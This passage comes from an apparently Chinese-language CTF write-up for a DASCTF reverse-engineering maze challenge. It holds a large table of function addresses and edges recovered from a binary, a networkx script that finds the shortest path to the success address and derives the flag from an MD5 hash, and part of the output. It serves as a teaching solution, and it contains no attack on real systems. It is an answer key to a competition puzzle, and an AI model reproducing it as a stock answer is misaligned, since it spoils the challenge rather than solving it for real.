class="number">4314192</span>, <span class="number">4314512</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4314352</span>, <span class="number">4314672</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4314512</span>, <span class="number">4314832</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4314672</span>, <span class="number">4314992</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4314832</span>, <span class="number">4315152</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4314992</span>, <span class="number">4315312</span>, <span class="number">4319328</span>, <span class="literal">None</span>], [<span class="number">4315152</span>, <span class="number">4315472</span>, <span class="literal">None</span>, <span class="number">4309824</span>], [<span class="number">4315312</span>, <span class="number">4315632</span>, <span class="literal">None</span>, <span class="number">4309984</span>], [<span class="number">4315472</span>, <span class="number">4315792</span>, <span class="number">4319472</span>, <span class="literal">None</span>], [<span class="number">4315632</span>, <span class="number">4315952</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4315792</span>, <span class="number">4316112</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4315952</span>, <span class="number">4316272</span>, <span class="literal">None</span>, <span class="number">4310144</span>], [<span class="number">4316112</span>, <span class="number">4316432</span>, <span class="literal">None</span>, <span class="number">4310304</span>], [<span class="number">4316272</span>, <span class="number">4316592</span>, <span class="literal">None</span>, <span class="number">4310464</span>], [<span class="number">4316432</span>, <span class="number">4316736</span>, <span class="number">4319616</span>, <span class="number">4310624</span>], [<span class="number">4316592</span>, <span class="number">4316896</span>, <span class="literal">None</span>, <span class="number">4310784</span>], [<span class="number">4316736</span>, <span class="number">4317024</span>, <span class="literal">None</span>, <span class="number">4310944</span>], [<span class="number">4316896</span>, <span class="number">4317184</span>, <span class="literal">None</span>, <span class="number">4311104</span>], [<span class="number">4317024</span>, <span class="number">4317344</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4317184</span>, <span class="number">4317504</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4317344</span>, <span class="number">4317664</span>, <span class="number">4319760</span>, <span class="literal">None</span>], [<span class="number">4317504</span>, <span class="number">4317824</span>, <span class="literal">None</span>, <span class="number">4311264</span>], [<span class="number">4317664</span>, <span class="number">4317984</span>, <span class="literal">None</span>, <span class="number">4311424</span>], [<span class="number">4317824</span>, <span class="number">4318112</span>, <span class="literal">None</span>, <span class="number">4311584</span>], [<span class="number">4317984</span>, <span class="number">4318272</span>, <span class="literal">None</span>, <span class="number">4311744</span>], [<span class="number">4318112</span>, <span class="number">4318432</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4318272</span>, <span class="number">4318592</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4318432</span>, <span class="number">4318752</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4318592</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4311888</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4319920</span>, <span class="number">4312176</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4313712</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4314032</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4315152</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4315632</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4320080</span>, <span class="number">4316592</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4320240</span>, <span class="number">4317504</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4321472</span>, <span class="number">4318896</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4321600</span>, <span class="number">4319616</span>], [<span class="literal">None</span>, <span class="number">4320400</span>, <span class="number">4321760</span>, <span class="number">4319760</span>], [<span class="number">4320240</span>, <span class="number">4320560</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4320400</span>, <span class="number">4320720</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4320560</span>, <span class="number">4320880</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4320720</span>, <span class="number">4321024</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4320880</span>, <span class="number">4321184</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4321024</span>, <span class="number">4321344</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4321184</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4319920</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4321904</span>, <span class="number">4320080</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4320240</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4321600</span>]]</span><br><span class="line">func_list = [<span class="number">4198480</span>, <span class="number">4198624</span>, <span class="number">4198784</span>, <span class="number">4198944</span>, <span class="number">4199104</span>, <span class="number">4199264</span>, <span class="number">4199424</span>, <span class="number">4199584</span>, <span class="number">4199744</span>, <span class="number">4199904</span>, <span class="number">4200064</span>, <span class="number">4200224</span>, <span class="number">4200384</span>, <span class="number">4200544</span>, <span class="number">4200688</span>, <span class="number">4200848</span>, <span class="number">4201008</span>, <span class="number">4201168</span>, <span class="number">4201312</span>, <span class="number">4201456</span>, <span class="number">4201616</span>, <span class="number">4201776</span>, <span class="number">4201936</span>, <span class="number">4202096</span>, <span class="number">4202240</span>, <span class="number">4202384</span>, <span class="number">4202544</span>, <span class="number">4202704</span>, <span class="number">4202848</span>, <span class="number">4203008</span>, <span class="number">4203168</span>, <span class="number">4203328</span>, <span class="number">4203488</span>, <span class="number">4203648</span>, <span class="number">4203808</span>, <span class="number">4203968</span>, <span class="number">4204128</span>, <span class="number">4204272</span>, <span class="number">4204432</span>, <span class="number">4204592</span>, <span class="number">4204752</span>, <span class="number">4204912</span>, <span class="number">4205056</span>, <span class="number">4205216</span>, <span class="number">4205376</span>, <span class="number">4205536</span>, <span class="number">4205680</span>, <span class="number">4205824</span>, <span class="number">4205984</span>, <span class="number">4206144</span>, <span class="number">4206304</span>, <span class="number">4206448</span>, <span class="number">4206608</span>, <span class="number">4206768</span>, <span class="number">4206928</span>, <span class="number">4207088</span>, <span class="number">4207232</span>, <span class="number">4207392</span>, <span class="number">4207552</span>, <span class="number">4207712</span>, <span class="number">4207872</span>, <span class="number">4208032</span>, <span class="number">4208192</span>, <span class="number">4208352</span>, <span class="number">4208496</span>, <span class="number">4208656</span>, <span class="number">4208816</span>, <span class="number">4208960</span>, <span class="number">4209120</span>, <span class="number">4209280</span>, <span class="number">4209440</span>, <span class="number">4209600</span>, <span class="number">4209760</span>, <span class="number">4209904</span>, <span class="number">4210064</span>, <span class="number">4210224</span>, <span class="number">4210368</span>, <span class="number">4210528</span>, <span class="number">4210688</span>, <span class="number">4210832</span>, <span class="number">4210992</span>, <span class="number">4211152</span>, <span class="number">4211312</span>, <span class="number">4211472</span>, <span class="number">4211632</span>, <span class="number">4211792</span>, <span class="number">4211952</span>, <span class="number">4212112</span>, <span class="number">4212272</span>, <span class="number">4212432</span>, <span class="number">4212592</span>, <span class="number">4212752</span>, <span class="number">4212912</span>, <span class="number">4213072</span>, <span class="number">4213232</span>, <span class="number">4213392</span>, <span class="number">4213552</span>, <span class="number">4213696</span>, <span class="number">4213856</span>, <span class="number">4214016</span>, <span class="number">4214176</span>, <span class="number">4214320</span>, <span class="number">4214480</span>, <span class="number">4214640</span>, <span class="number">4214800</span>, <span class="number">4214960</span>, <span class="number">4215120</span>, <span class="number">4215280</span>, <span class="number">4215440</span>, <span class="number">4215584</span>, <span class="number">4215744</span>, <span class="number">4215904</span>, <span class="number">4216064</span>, <span class="number">4216208</span>, <span class="number">4216352</span>, <span class="number">4216512</span>, <span class="number">4216672</span>, <span class="number">4216832</span>, <span class="number">4216992</span>, <span class="number">4217136</span>, <span class="number">4217296</span>, <span class="number">4217440</span>, <span class="number">4217600</span>, <span class="number">4217760</span>, <span class="number">4217920</span>, <span class="number">4218080</span>, <span class="number">4218240</span>, <span class="number">4218400</span>, <span class="number">4218560</span>, <span class="number">4218720</span>, <span class="number">4218880</span>, <span class="number">4219040</span>, <span class="number">4219200</span>, <span class="number">4219360</span>, <span class="number">4219520</span>, <span class="number">4219680</span>, <span class="number">4219840</span>, <span class="number">4219984</span>, <span class="number">4220144</span>, <span class="number">4220304</span>, <span class="number">4220464</span>, <span class="number">4220608</span>, <span class="number">4220768</span>, <span class="number">4220928</span>, <span class="number">4221088</span>, <span class="number">4221232</span>, <span class="number">4221392</span>, <span class="number">4221552</span>, <span class="number">4221712</span>, <span class="number">4221872</span>, <span class="number">4222032</span>, <span class="number">4222192</span>, <span class="number">4222352</span>, <span class="number">4222496</span>, <span class="number">4222640</span>, <span class="number">4222800</span>, <span class="number">4222928</span>, <span class="number">4223088</span>, <span class="number">4223248</span>, <span class="number">4223408</span>, <span class="number">4223568</span>, <span class="number">4223712</span>, <span class="number">4223856</span>, <span class="number">4224016</span>, <span class="number">4224176</span>, <span class="number">4224336</span>, <span class="number">4224496</span>, <span class="number">4224656</span>, <span class="number">4224816</span>, <span class="number">4224976</span>, <span class="number">4225120</span>, <span class="number">4225264</span>, <span class="number">4225424</span>, <span class="number">4225584</span>, <span class="number">4225744</span>, <span class="number">4225888</span>, <span class="number">4226048</span>, <span class="number">4226208</span>, <span class="number">4226368</span>, <span class="number">4226528</span>, <span class="number">4226688</span>, <span class="number">4226848</span>, <span class="number">4227008</span>, <span class="number">4227168</span>, <span class="number">4227328</span>, <span class="number">4227488</span>, <span class="number">4227648</span>, <span class="number">4227808</span>, <span class="number">4227968</span>, <span class="number">4228112</span>, <span class="number">4228272</span>, <span class="number">4228416</span>, <span class="number">4228576</span>, <span class="number">4228736</span>, <span class="number">4228896</span>, <span class="number">4229056</span>, <span class="number">4229216</span>, <span class="number">4229376</span>, <span class="number">4229520</span>, <span class="number">4229680</span>, <span class="number">4229840</span>, <span class="number">4229984</span>, <span class="number">4230144</span>, <span class="number">4230288</span>, <span class="number">4230448</span>, <span class="number">4230608</span>, <span class="number">4230768</span>, <span class="number">4230928</span>, <span class="number">4231088</span>, <span class="number">4231248</span>, <span class="number">4231408</span>, <span class="number">4231568</span>, <span class="number">4231728</span>, <span class="number">4231888</span>, <span class="number">4232048</span>, <span class="number">4232208</span>, <span class="number">4232368</span>, <span class="number">4232528</span>, <span class="number">4232672</span>, <span class="number">4232832</span>, <span class="number">4232992</span>, <span class="number">4233152</span>, <span class="number">4233312</span>, <span class="number">4233472</span>, <span class="number">4233616</span>, <span class="number">4233776</span>, <span class="number">4233920</span>, <span class="number">4234080</span>, <span class="number">4234240</span>, <span class="number">4234400</span>, <span class="number">4234560</span>, <span class="number">4234720</span>, <span class="number">4234880</span>, <span class="number">4235040</span>, <span class="number">4235200</span>, <span class="number">4235328</span>, <span class="number">4235488</span>, <span class="number">4235632</span>, <span class="number">4235792</span>, <span class="number">4235952</span>, <span class="number">4236112</span>, <span class="number">4236272</span>, <span class="number">4236432</span>, <span class="number">4236576</span>, <span class="number">4236736</span>, <span class="number">4236896</span>, <span class="number">4237056</span>, <span class="number">4237216</span>, <span class="number">4237376</span>, <span class="number">4237520</span>, <span class="number">4237664</span>, <span class="number">4237824</span>, <span class="number">4237984</span>, <span class="number">4238144</span>, <span class="number">4238304</span>, <span class="number">4238464</span>, <span class="number">4238624</span>, <span class="number">4238784</span>, <span class="number">4238944</span>, <span class="number">4239104</span>, <span class="number">4239264</span>, <span class="number">4239424</span>, <span class="number">4239584</span>, <span class="number">4239744</span>, <span class="number">4239904</span>, <span class="number">4240064</span>, <span class="number">4240224</span>, <span class="number">4240368</span>, <span class="number">4240528</span>, <span class="number">4240688</span>, <span class="number">4240848</span>, <span class="number">4241008</span>, <span class="number">4241168</span>, <span class="number">4241312</span>, <span class="number">4241456</span>, <span class="number">4241616</span>, <span class="number">4241776</span>, <span class="number">4241936</span>, <span class="number">4242096</span>, <span class="number">4242256</span>, <span class="number">4242416</span>, <span class="number">4242576</span>, <span class="number">4242736</span>, <span class="number">4242896</span>, <span class="number">4243040</span>, <span class="number">4243200</span>, <span class="number">4243360</span>, <span class="number">4243504</span>, <span class="number">4243664</span>, <span class="number">4243824</span>, <span class="number">4243984</span>, <span class="number">4244144</span>, <span class="number">4244288</span>, <span class="number">4244448</span>, <span class="number">4244608</span>, <span class="number">4244768</span>, <span class="number">4244928</span>, <span class="number">4245072</span>, <span class="number">4245232</span>, <span class="number">4245392</span>, <span class="number">4245536</span>, <span class="number">4245696</span>, <span class="number">4245840</span>, <span class="number">4246000</span>, <span class="number">4246160</span>, <span class="number">4246320</span>, <span class="number">4246480</span>, <span class="number">4246640</span>, <span class="number">4246800</span>, <span class="number">4246960</span>, <span class="number">4247120</span>, <span class="number">4247280</span>, <span class="number">4247440</span>, <span class="number">4247600</span>, <span class="number">4247744</span>, <span class="number">4247904</span>, <span class="number">4248064</span>, <span class="number">4248224</span>, <span class="number">4248384</span>, <span class="number">4248544</span>, <span class="number">4248704</span>, <span class="number">4248864</span>, <span class="number">4249024</span>, <span class="number">4249184</span>, <span class="number">4249344</span>, <span class="number">4249504</span>, <span class="number">4249664</span>, <span class="number">4249824</span>, <span class="number">4249984</span>, <span class="number">4250144</span>, <span class="number">4250304</span>, <span class="number">4250464</span>, <span class="number">4250624</span>, <span class="number">4250784</span>, <span class="number">4250944</span>, <span class="number">4251088</span>, <span class="number">4251248</span>, <span class="number">4251408</span>, <span class="number">4251568</span>, <span class="number">4251712</span>, <span class="number">4251872</span>, <span class="number">4252032</span>, <span class="number">4252192</span>, <span class="number">4252336</span>, <span class="number">4252496</span>, <span class="number">4252656</span>, <span class="number">4252816</span>, <span class="number">4252976</span>, <span class="number">4253136</span>, <span class="number">4253296</span>, <span class="number">4253456</span>, <span class="number">4253616</span>, <span class="number">4253776</span>, <span class="number">4253936</span>, <span class="number">4254096</span>, <span class="number">4254240</span>, <span class="number">4254400</span>, <span class="number">4254544</span>, <span class="number">4254704</span>, <span class="number">4254848</span>, <span class="number">4255008</span>, <span class="number">4255152</span>, <span class="number">4255312</span>, <span class="number">4255472</span>, <span class="number">4255616</span>, <span class="number">4255776</span>, <span class="number">4255936</span>, <span class="number">4256080</span>, <span class="number">4256240</span>, <span class="number">4256400</span>, <span class="number">4256560</span>, <span class="number">4256704</span>, <span class="number">4256848</span>, <span class="number">4257008</span>, <span class="number">4257152</span>, <span class="number">4257312</span>, <span class="number">4257472</span>, <span class="number">4257632</span>, <span class="number">4257760</span>, <span class="number">4257920</span>, <span class="number">4258080</span>, <span class="number">4258240</span>, <span class="number">4258400</span>, <span class="number">4258544</span>, <span class="number">4258704</span>, <span class="number">4258864</span>, <span class="number">4259024</span>, <span class="number">4259184</span>, <span class="number">4259344</span>, <span class="number">4259488</span>, <span class="number">4259648</span>, <span class="number">4259808</span>, <span class="number">4259968</span>, <span class="number">4260128</span>, <span class="number">4260288</span>, <span class="number">4260448</span>, <span class="number">4260592</span>, <span class="number">4260752</span>, <span class="number">4260912</span>, <span class="number">4261072</span>, <span class="number">4261232</span>, <span class="number">4261392</span>, <span class="number">4261552</span>, <span class="number">4261712</span>, <span class="number">4261872</span>, <span class="number">4262032</span>, <span class="number">4262176</span>, <span class="number">4262320</span>, <span class="number">4262480</span>, <span class="number">4262640</span>, <span class="number">4262800</span>, <span class="number">4262960</span>, <span class="number">4263120</span>, <span class="number">4263280</span>, <span class="number">4263440</span>, <span class="number">4263600</span>, <span class="number">4263760</span>, <span class="number">4263920</span>, <span class="number">4264080</span>, <span class="number">4264240</span>, <span class="number">4264400</span>, <span class="number">4264560</span>, <span class="number">4264720</span>, <span class="number">4264880</span>, <span class="number">4265040</span>, <span class="number">4265200</span>, <span class="number">4265344</span>, <span class="number">4265504</span>, <span class="number">4265648</span>, <span class="number">4265792</span>, <span class="number">4265952</span>, <span class="number">4266112</span>, <span class="number">4266272</span>, <span class="number">4266432</span>, <span class="number">4266592</span>, <span class="number">4266752</span>, <span class="number">4266912</span>, <span class="number">4267072</span>, <span class="number">4267232</span>, <span class="number">4267392</span>, <span class="number">4267552</span>, <span class="number">4267712</span>, <span class="number">4267872</span>, <span class="number">4268032</span>, <span class="number">4268192</span>, <span class="number">4268352</span>, <span class="number">4268496</span>, <span class="number">4268656</span>, <span class="number">4268816</span>, <span class="number">4268976</span>, <span class="number">4269136</span>, <span class="number">4269296</span>, <span class="number">4269456</span>, <span class="number">4269616</span>, <span class="number">4269760</span>, <span class="number">4269920</span>, <span class="number">4270080</span>, <span class="number">4270240</span>, <span class="number">4270400</span>, <span class="number">4270560</span>, <span class="number">4270720</span>, <span class="number">4270880</span>, <span class="number">4271040</span>, <span class="number">4271184</span>, <span class="number">4271328</span>, <span class="number">4271488</span>, <span class="number">4271648</span>, <span class="number">4271808</span>, <span class="number">4271968</span>, <span class="number">4272128</span>, <span class="number">4272288</span>, <span class="number">4272448</span>, <span class="number">4272608</span>, <span class="number">4272768</span>, <span class="number">4272928</span>, <span class="number">4273088</span>, <span class="number">4273248</span>, <span class="number">4273392</span>, <span class="number">4273552</span>, <span class="number">4273696</span>, <span class="number">4273840</span>, <span class="number">4274000</span>, <span class="number">4274160</span>, <span class="number">4274320</span>, <span class="number">4274480</span>, <span class="number">4274640</span>, <span class="number">4274800</span>, <span class="number">4274960</span>, <span class="number">4275120</span>, <span class="number">4275280</span>, <span class="number">4275440</span>, <span class="number">4275584</span>, <span class="number">4275744</span>, <span class="number">4275904</span>, <span class="number">4276064</span>, <span class="number">4276208</span>, <span class="number">4276368</span>, <span class="number">4276528</span>, <span class="number">4276688</span>, <span class="number">4276848</span>, <span class="number">4277008</span>, <span class="number">4277168</span>, <span class="number">4277328</span>, <span class="number">4277488</span>, <span class="number">4277648</span>, <span class="number">4277808</span>, <span class="number">4277968</span>, <span class="number">4278128</span>, <span class="number">4278288</span>, <span class="number">4278448</span>, <span class="number">4278608</span>, <span class="number">4278768</span>, <span class="number">4278928</span>, <span class="number">4279072</span>, <span class="number">4279216</span>, <span class="number">4279376</span>, <span class="number">4279536</span>, <span class="number">4279696</span>, <span class="number">4279840</span>, <span class="number">4280000</span>, <span class="number">4280160</span>, <span class="number">4280304</span>, <span class="number">4280464</span>, <span class="number">4280624</span>, <span class="number">4280784</span>, <span class="number">4280944</span>, <span class="number">4281088</span>, <span class="number">4281248</span>, <span class="number">4281408</span>, <span class="number">4281568</span>, <span class="number">4281728</span>, <span class="number">4281888</span>, <span class="number">4282048</span>, <span class="number">4282208</span>, <span class="number">4282352</span>, <span class="number">4282512</span>, <span class="number">4282656</span>, <span class="number">4282816</span>, <span class="number">4282976</span>, <span class="number">4283136</span>, <span class="number">4283296</span>, <span class="number">4283456</span>, <span class="number">4283616</span>, <span class="number">4283776</span>, <span class="number">4283936</span>, <span class="number">4284096</span>, <span class="number">4284256</span>, <span class="number">4284416</span>, <span class="number">4284576</span>, <span class="number">4284736</span>, <span class="number">4284896</span>, <span class="number">4285056</span>, <span class="number">4285216</span>, <span class="number">4285376</span>, <span class="number">4285536</span>, <span class="number">4285696</span>, <span class="number">4285856</span>, <span class="number">4286016</span>, <span class="number">4286176</span>, <span class="number">4286336</span>, <span class="number">4286496</span>, <span class="number">4286656</span>, <span class="number">4286816</span>, <span class="number">4286976</span>, <span class="number">4287120</span>, <span class="number">4287264</span>, <span class="number">4287424</span>, <span class="number">4287584</span>, <span class="number">4287744</span>, <span class="number">4287904</span>, <span class="number">4288064</span>, <span class="number">4288224</span>, <span class="number">4288384</span>, <span class="number">4288528</span>, <span class="number">4288688</span>, <span class="number">4288848</span>, <span class="number">4288992</span>, <span class="number">4289152</span>, <span class="number">4289312</span>, <span class="number">4289472</span>, <span class="number">4289632</span>, <span class="number">4289792</span>, <span class="number">4289952</span>, <span class="number">4290112</span>, <span class="number">4290272</span>, <span class="number">4290432</span>, <span class="number">4290592</span>, <span class="number">4290752</span>, <span class="number">4290912</span>, <span class="number">4291072</span>, <span class="number">4291232</span>, <span class="number">4291376</span>, <span class="number">4291536</span>, <span class="number">4291696</span>, <span class="number">4291856</span>, <span class="number">4292000</span>, <span class="number">4292144</span>, <span class="number">4292288</span>, <span class="number">4292448</span>, <span class="number">4292608</span>, <span class="number">4292768</span>, <span class="number">4292928</span>, <span class="number">4293088</span>, <span class="number">4293248</span>, <span class="number">4293392</span>, <span class="number">4293552</span>, <span class="number">4293696</span>, <span class="number">4293856</span>, <span class="number">4294016</span>, <span class="number">4294160</span>, <span class="number">4294320</span>, <span class="number">4294480</span>, <span class="number">4294640</span>, <span class="number">4294800</span>, <span class="number">4294944</span>, <span class="number">4295088</span>, <span class="number">4295232</span>, <span class="number">4295392</span>, <span class="number">4295552</span>, <span class="number">4295696</span>, <span class="number">4295856</span>, <span class="number">4296016</span>, <span class="number">4296176</span>, <span class="number">4296336</span>, <span class="number">4296496</span>, <span class="number">4296656</span>, <span class="number">4296816</span>, <span class="number">4296976</span>, <span class="number">4297136</span>, <span class="number">4297296</span>, <span class="number">4297424</span>, <span class="number">4297584</span>, <span class="number">4297744</span>, <span class="number">4297904</span>, <span class="number">4298064</span>, <span class="number">4298224</span>, <span class="number">4298384</span>, <span class="number">4298528</span>, <span class="number">4298688</span>, <span class="number">4298848</span>, <span class="number">4299008</span>, <span class="number">4299168</span>, <span class="number">4299312</span>, <span class="number">4299472</span>, <span class="number">4299632</span>, <span class="number">4299792</span>, <span class="number">4299936</span>, <span class="number">4300096</span>, <span class="number">4300256</span>, <span class="number">4300416</span>, <span class="number">4300576</span>, <span class="number">4300720</span>, <span class="number">4300864</span>, <span class="number">4301024</span>, <span class="number">4301184</span>, <span class="number">4301344</span>, <span class="number">4301504</span>, <span class="number">4301648</span>, <span class="number">4301808</span>, <span class="number">4301968</span>, <span class="number">4302128</span>, <span class="number">4302288</span>, <span class="number">4302448</span>, <span class="number">4302608</span>, <span class="number">4302768</span>, <span class="number">4302912</span>, <span class="number">4303072</span>, <span class="number">4303232</span>, <span class="number">4303392</span>, <span class="number">4303552</span>, <span class="number">4303712</span>, <span class="number">4303872</span>, <span class="number">4304032</span>, <span class="number">4304192</span>, <span class="number">4304352</span>, <span class="number">4304496</span>, <span class="number">4304656</span>, <span class="number">4304816</span>, <span class="number">4304976</span>, <span class="number">4305136</span>, <span class="number">4305296</span>, <span class="number">4305456</span>, <span class="number">4305616</span>, <span class="number">4305776</span>, <span class="number">4305936</span>, <span class="number">4306096</span>, <span class="number">4306256</span>, <span class="number">4306400</span>, <span class="number">4306560</span>, <span class="number">4306720</span>, <span class="number">4306880</span>, <span class="number">4307024</span>, <span class="number">4307184</span>, <span class="number">4307344</span>, <span class="number">4307504</span>, <span class="number">4307664</span>, <span class="number">4307808</span>, <span class="number">4307968</span>, <span class="number">4308128</span>, <span class="number">4308288</span>, <span class="number">4308448</span>, <span class="number">4308576</span>, <span class="number">4308720</span>, <span class="number">4308880</span>, <span class="number">4309040</span>, <span class="number">4309200</span>, <span class="number">4309360</span>, <span class="number">4309520</span>, <span class="number">4309680</span>, <span class="number">4309824</span>, <span class="number">4309984</span>, <span class="number">4310144</span>, <span class="number">4310304</span>, <span class="number">4310464</span>, <span class="number">4310624</span>, <span class="number">4310784</span>, <span class="number">4310944</span>, <span class="number">4311104</span>, <span class="number">4311264</span>, <span class="number">4311424</span>, <span class="number">4311584</span>, <span class="number">4311744</span>, <span class="number">4311888</span>, <span class="number">4312048</span>, <span class="number">4312176</span>, <span class="number">4312336</span>, <span class="number">4312496</span>, <span class="number">4312624</span>, <span class="number">4312784</span>, <span class="number">4312928</span>, <span class="number">4313088</span>, <span class="number">4313248</span>, <span class="number">4313408</span>, <span class="number">4313568</span>, <span class="number">4313712</span>, <span class="number">4313872</span>, <span class="number">4314032</span>, <span class="number">4314192</span>, <span class="number">4314352</span>, <span class="number">4314512</span>, <span class="number">4314672</span>, <span class="number">4314832</span>, <span class="number">4314992</span>, <span class="number">4315152</span>, <span class="number">4315312</span>, <span class="number">4315472</span>, <span class="number">4315632</span>, <span class="number">4315792</span>, <span class="number">4315952</span>, <span class="number">4316112</span>, <span class="number">4316272</span>, <span class="number">4316432</span>, <span class="number">4316592</span>, <span class="number">4316736</span>, <span class="number">4316896</span>, <span class="number">4317024</span>, <span class="number">4317184</span>, <span class="number">4317344</span>, <span class="number">4317504</span>, <span class="number">4317664</span>, <span class="number">4317824</span>, <span class="number">4317984</span>, <span class="number">4318112</span>, <span class="number">4318272</span>, <span class="number">4318432</span>, <span class="number">4318592</span>, <span class="number">4318752</span>, <span class="number">4318896</span>, <span class="number">4319056</span>, <span class="number">4319200</span>, <span class="number">4319328</span>, <span class="number">4319472</span>, <span class="number">4319616</span>, <span class="number">4319760</span>, <span class="number">4319920</span>, <span class="number">4320080</span>, <span class="number">4320240</span>, <span class="number">4320400</span>, <span class="number">4320560</span>, <span class="number">4320720</span>, <span class="number">4320880</span>, <span class="number">4321024</span>, <span class="number">4321184</span>, <span class="number">4321344</span>, <span class="number">4321472</span>, <span class="number">4321600</span>, <span class="number">4321760</span>, <span class="number">4321904</span>]</span><br><span class="line"></span><br><span class="line">src_node = <span class="number">0x401050</span>     <span class="comment"># 起点</span></span><br><span class="line">target_node = <span class="number">0x41F1E0</span>  <span class="comment"># 终点</span></span><br><span class="line"></span><br><span class="line">G = nx.MultiDiGraph()   <span class="comment"># 生成一张空图，Mul允许2个节点之间存在多个边，Di代表边是有方向的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> func_list:     </span><br><span class="line">    G.add_node(i)       <span class="comment"># 添加节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span>  <span class="built_in">enumerate</span>(all_edges):</span><br><span class="line">    src = func_list[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> value:</span><br><span class="line">        <span class="keyword">if</span> j != <span class="literal">None</span>:           <span class="comment"># 不为None,就可以构造一条边</span></span><br><span class="line">            dst = j</span><br><span class="line">            G.add_edge(src, dst)</span><br><span class="line"></span><br><span class="line">path = nx.shortest_path(G, source = src_node, target = target_node)     <span class="comment"># 直接调用此函数就可以求出最短路径经过的那几个节点</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(path))</span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> path])</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(path)):<span class="comment"># 根据得到的结果来求出每一步走的方向</span></span><br><span class="line">    func_index = func_list.index(path[i - <span class="number">1</span>])</span><br><span class="line">    index = all_edges[func_index].index(path[i])</span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        s += <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">1</span>:</span><br><span class="line">        s += <span class="string">&#x27;d&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">2</span>:</span><br><span class="line">        s += <span class="string">&#x27;s&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s += <span class="string">&#x27;w&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功的地方在41F1E0处</span></span><br><span class="line"><span class="comment"># case &#x27;s&#x27;:</span></span><br><span class="line"><span class="comment">#         result = printf(&quot;Great!!!you got it!flag is DASCTF&#123;md5&#123;your input&#125;\n&quot;);</span></span><br><span class="line"><span class="comment">#         break;</span></span><br><span class="line">input_ = s + <span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(input_) </span><br><span class="line"><span class="comment"># DASCTF&#123;md5&#123;your input&#125;\n&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DASCTF&#123;%s&#125;&quot;</span> % hashlib.md5(input_.encode()).hexdigest())、</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">496</span><br><span class="line">[&#x27;0x401050&#x27;, &#x27;0x4010e0&#x27;, &#x27;0x401180&#x27;, &#x27;0x403460&#x27;, &#x27;0x403500&#x27;, &#x27;0x4035a0&#x27;, &#x27;0x403640&#x27;, &#x27;0x4036e0&#x27;, &#x27;0x403770&#x27;, &#x27;0x403810&#x27;, &#x27;0x4038b0&#x27;, &#x27;0x403940&#x27;, &#x27;0x4039e0&#x27;, &#x27;0x403a80&#x27;, &#x27;0x403b20&#x27;, &#x27;0x403bc0&#x27;, &#x27;0x403c60&#x27;, &#x27;0x403cf0&#x27;, &#x27;0x403d90&#x27;, &#x27;0x403e30&#x27;, &#x27;0x403ec0&#x27;, &#x27;0x403f60&#x27;, &#x27;0x404630&#x27;, &#x27;0x405e20&#x27;, &#x27;0x406450&#x27;, &#x27;0x406eb0&#x27;, &#x27;0x408060&#x27;, &#x27;0x4087c0&#x27;, &#x27;0x4097c0&#x27;, &#x27;0x40a520&#x27;, &#x27;0x40b490&#x27;, &#x27;0x40b970&#x27;, &#x27;0x40ba10&#x27;, &#x27;0x40bab0&#x27;, &#x27;0x40bb50&#x27;, 